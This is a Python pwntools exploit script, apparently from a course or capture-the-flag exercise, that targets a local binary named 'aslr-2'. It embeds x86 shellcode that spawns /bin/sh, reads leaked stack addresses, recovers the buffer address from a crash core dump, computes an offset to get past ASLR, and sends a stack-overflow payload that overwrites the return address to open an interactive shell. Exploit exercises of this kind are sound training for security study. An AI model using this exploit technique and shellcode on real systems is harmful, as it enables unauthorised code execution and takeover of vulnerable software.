#!/usr/bin/env python
from pwn import *

shell = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'
p = process('./aslr-2')

###############################################################################
#all the output
output = p.recv()
print(output)
print('\n')

# get each individual word of output
word = output.split(' ')
#print(word)
#print('\n')

# only get the hexs
hex_vals=[]
for i in word:
    if 'x' in i:
        hex_vals.append(i)
# trim of 'Please' at the last hex val...
hex_vals[len(hex_vals)-1]=hex_vals[len(hex_vals)-1].split('\n')[0]

# turn the hex values into integers
int_vals=[]
for i in hex_vals:
    x=int(i,16)
    int_vals.append(x)
###############################################################################

# crash to get core and get buffer addr
buf = 'A'*0x100
p.send(buf)
p.wait()
c=Core('core')
buffer_addr_from_core = c.stack.find(buf)
shell_addr = c.stack.find('sh')
print(hex(shell_addr))
print('buffer addr from core: ')
print(hex(buffer_addr_from_core))


# Slide 17:
# Calculate the distance between the leaked one and the one with interest
#   OFFSET = BUFFER_ADDRESS - LEAKED_ADDRESS
#offset_array=[addr-addr_buffer for addr in int_vals]
offset = int_vals[1] - buffer_addr_from_core
print('1st offset: ')
print(offset)

# CHECK that this is the buffer addr
# offset + buffer_addr = int_vals
# buffer_addr = int_vals-offset
buffer_addr_check=((int_vals[1]-offset))
print ('buffer_addr_check = int[0] - offset = ')
print(hex(buffer_addr_check))

p = process('./aslr-2')

##############################################################################
#all the output
output = p.recv()
print(output)
print('\n')

# get each individual word of output
word = output.split(' ')

# only get the hexs
hex_vals=[]
for i in word:
    if 'x' in i:
        hex_vals.append(i)
# trim of 'Please' at the last hex val...
hex_vals[len(hex_vals)-1]=hex_vals[len(hex_vals)-1].split('\n')[0]
#print(hex_vals)
#print('\n')

# turn the hex values into integers
int_vals=[]
for i in hex_vals:
    x=int(i,16)
    int_vals.append(x)
###############################################################################

#buff_addr = int_vals[0]-offset_array[0]
buff_addr = int_vals[1] - offset
print('new buff_addr: ')
print(hex(buff_addr))
buff = shell + "A"*(0x88-len(shell))+"AAAA" + p32(buff_addr)
#print('sending: ')
#print(buff)
p.sendline(buff)
p.interactive()

